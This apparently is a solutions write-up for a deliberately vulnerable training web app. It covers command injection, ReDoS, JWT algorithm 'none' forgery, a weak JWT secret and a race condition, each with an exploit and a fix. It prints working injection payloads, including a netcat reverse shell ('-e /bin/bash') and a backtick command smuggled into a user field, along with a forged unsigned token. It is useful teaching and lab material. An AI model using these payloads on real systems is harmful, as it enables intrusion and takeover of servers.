# CMD
## Exploit
```50;touch AAAAAAA;``` . 
really makes the file, so execution is possible . 

For a real exploit, we first need to listen to a certain port on our own system:  
```nc -lvp 4444``` . 
Then in the payload we will use netcat to connect to this listening port and initiate a shell:  
```50; nc 127.0.0.1 4444 -e /bin/bash;``` . 

If you do not have nc but you just want to check if your code execution works, you could for example overwrite the index.html:
```;echo "<html>rishu's solution</html>" > templates/index.html;``` . 

## Fix
change:  
```    os.system('convert static/img/bones.png -resize '+sizeImg+'% static/img/bones.png')``` . 
to:  
```
    whitelist = {"50","150"}
    if sizeImg in whitelist:
        os.system('convert static/img/bones.png -resize '+sizeImg+'% static/img/bones.png')
```  
alternative in php template: escapeshellarg() or escapeshellcmd() in PHP . 


# DoS regex
## Exploit
aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa . 
will crash the system

## Fix
replace:  
```    match = re.search(r"^([0-9a-zA-Z]([-.\w]*[0-9a-zA-Z])*@{1}([0-9a-zA-Z][-\w]*[0-9a-zA-Z]\.)+[a-zA-Z]{2,9})$", str(email))```  
with:  
```    match = re.search(r"^([0-9a-zA-Z-.\w])+@{1}([0-9a-zA-Z-\w]+\.)+[a-zA-Z]{2,9}$", str(email))``` . 

So this is not according to the RFC but fixes the issue in the application.  

https://www.owasp.org/index.php/Regular_expression_Denial_of_Service_-_ReDoS . 


# JWT
Make sure you have all imports installed if you run the python code locally:  
pip3 install -r requirements.txt . 

Interesting blog post:
https://hackernoon.com/can-timing-attack-be-a-practical-security-threat-on-jwt-signature-ba3c8340dea9

## Exploit
After authentication you receive a JWT where you can swith the algorithm in the header to "None":  
{
  "typ":"JWT",
  "alg":"NONE"
}
   
-> ewogICJ0eXAiOiJKV1QiLAogICJhbGciOiJOT05FIgp9 . 
ewogICJ0eXAiOiJKV1QiLAogICJhbGciOiJOT05FIgp9.eyJleHAiOjE1NTMwMDM3MTgsImlhdCI6MTU1MzAwMzQxOCwibmJmIjoxNTUzMDAzNDE4LCJpZGVudGl0eSI6Mn0.  
Open the local storage tab within the browser and replace the original token there.

You can check JWT at https://jwt.io/

## Fix
Do not allow algorithm "NONE" in the backend.

# JWT secret
## Exploit
Intercept and check JWT from response. After decoding, we can brute-force with:
https://github.com/jmaxxz/jwtbrute

## Fix
Use a better secret in:
```app.config['SECRET_KEY'] = 'secret'```

# Race condition
## Exploit
In the background, constantly try to execute the second step:
while true; do
    curl -i -s -k  -X $'GET' \
        -H $'Host: localhost:5000' -H $'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8' -H $'Accept-Language: en-US,en;q=0.5' -H $'Accept-Encoding: gzip, deflate ' -H $'Connection: close' -H $'Upgrade-Insecure-Requests: 1' \
        $'http://localhost:5000/?action=run' | grep "Check this out"
done

Then trigger the first call in the browser with characters that would normally not pass the input validation:
Default User`id`

## Fix
Do validation first and then write to file.
